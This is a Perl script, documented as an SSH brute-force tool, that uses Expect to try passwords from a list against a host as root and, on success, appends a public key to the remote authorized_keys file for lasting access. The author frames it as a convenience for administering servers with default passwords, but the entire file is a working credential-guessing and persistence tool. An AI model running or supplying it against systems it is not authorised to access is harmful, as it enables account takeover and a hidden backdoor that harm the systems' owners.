#!/usr/bin/perl

use strict;
use warnings;
use Expect;
use Getopt::Long;
use Pod::Usage;
use File::Basename qw(fileparse);

=head1 NAME

ssh-login.pl - brute force ssh accounts

=head1 SYNOPSIS

ssh-login.pl --password ~/password --keyfile ~/.ssh/id_rsa.pub --host 10.1.2.3

=head1 DESCRIPTION

This program will use a list of passwords and the system ssh client to try and
login to a remote host. 

It was written to ease the management of a large number of servers, all of
which had one of a collection of different "default" passwords. Going through
these passwords in an attempt to log in looses it's appeal after a time - hence
this tool. It's not designed to be fast, as the passwords are tried in serial.

If the program successfully logs on, and a public key has been specified with
--keyfile, the program will add the specified public key to the remote users
AuthorizedKeysFile file (defaults to ~/.ssh/authorized_keys) - but only if it
isn't already present. The permissions on this file are set to 600. If ~/.ssh/
doesn't exist it is created with permissions 700.

=head1 WARNING!

Make sure you keep the file containing your passwords secure!

=head1 OPTIONS

=over

=item B<--password F<file>>

File containing a list of newline seperated passwords to use.

=item B<--keyfile F<~/.ssh/id_rsa.pub>>

Path to an SSH public key file. Defaults to ~/.ssh/id_rsa.pub

=item B<--user root>

The username to attempt to log in as. Defaults to "root".

=item B<--host hostname>

The hostname/IP to attempt to log into.

=item B<--help>

Show the command line arguments.

=item B<--man>

Show the program documentation.

=back

=head1 BUGS

Probably relies on the remote user shell being bash.

Assumes the client is OpenSSH.

=head1 SEE ALSO

L<ssh_config(5)>, L<Expect>

=head1 AUTHOR

Jonathan Barber - jonathan.barber@gmail.com

=cut

my ($password, $keyfile, $host, $timeout, $user, $help, $man, $authorizedkeysfile);
GetOptions(
	"password=s" => \$password,
	"keyfile=s" => \$keyfile,
	"host=s" => \$host,
	"user=s" => \$user,
	"timeout=i" => \$timeout,
	"help" => \$help,
	"man" => \$man,
) or pod2usage(2);
pod2usage(1) if $help;
pod2usage(-exitstatus => 0, -verbose => 2) if $man;

$keyfile ||= "~/.ssh/id_rsa.pub";
$authorizedkeysfile ||= ".ssh/authorized_keys";
$timeout ||= 30;
$user    ||= "root";
my $cmd = "ssh -F /dev/null -l $user -o PubkeyAuthentication=no -o PasswordAuthentication=yes -o PreferredAuthentications=password -o NumberOfPasswordPrompts=1 -o ConnectTimeout=30";

my @passwds;
{
	open my $passwd_fh, $password or die "Can't open password file: $!\n";
	@passwds = map { chomp; $_; } <$passwd_fh>;
}

my $key;
if ($keyfile) {
	my ($file) = glob $keyfile;
	open my $fh, $file or die "Can't open public key file ($keyfile => $file): $!\n";
	$key = join "", <$fh>;
	chomp $key;
}

$host or die "Not given a --host to connect to!\n";

print my $lcmd = "$cmd $host\n";

# First try and connect to see if our key is present
if (1) {
	my $exp = Expect->spawn( "ssh -l $user -o PreferredAuthentications=publickey -o PasswordAuthentication=no -o ConnectTimeout=30 $host 2>&1\n" );
	$exp->expect( $timeout,
		[ qr#Are you sure you want to continue connecting (yes/no)?# => sub {
		       	$exp->send( "yes\n" );
			$exp->expect( $timeout,
				[ qr/$user@/ => sub { print "Already have access, skipping\n"; exit } ],
				[ timeout => sub { die "Timeout" } ],
			);
			$exp->soft_close;
	       	} ],
		[ qr/$user@/ => sub { print "Already have access, skipping\n"; exit } ],
		[ timeout => sub { die "Timeout" } ],
	);
	$exp->soft_close;
}

for my $passwd (@passwds) {
	my $exp = Expect->spawn( "$lcmd 2>&1" );
	$exp->expect( $timeout,
		[ qr/password: / => sub { exp_continue: } ],
		[ timeout => sub { die "Timeout" } ],
	);
	$exp->send( "$passwd\n" );
	$exp->expect( $timeout,
		[ qr/assword/ => sub { print "Denied...\n" } ],
		[ qr/enied/ => sub { print "Denied...\n" } ],
		[ qr/#|\$ / => sub {
			print "Snagged $passwd\n";
			if ($key) {
				my (undef, $dir) = fileparse($authorizedkeysfile);
				$exp->send( "[ -d $dir ] || mkdir -m 700 $dir\n" );
				$exp->send( qq#grep -q "$key" $authorizedkeysfile >/dev/null 2>&1 || (echo "$key" >> $authorizedkeysfile && chmod 600 $authorizedkeysfile)\n# );
			}
			$exp->send( "exit\n" );
			$exp->soft_close();
			exit; 
		} ],
		[ timeout => sub { die "Timeout" } ],
	);

	$exp->soft_close();
}
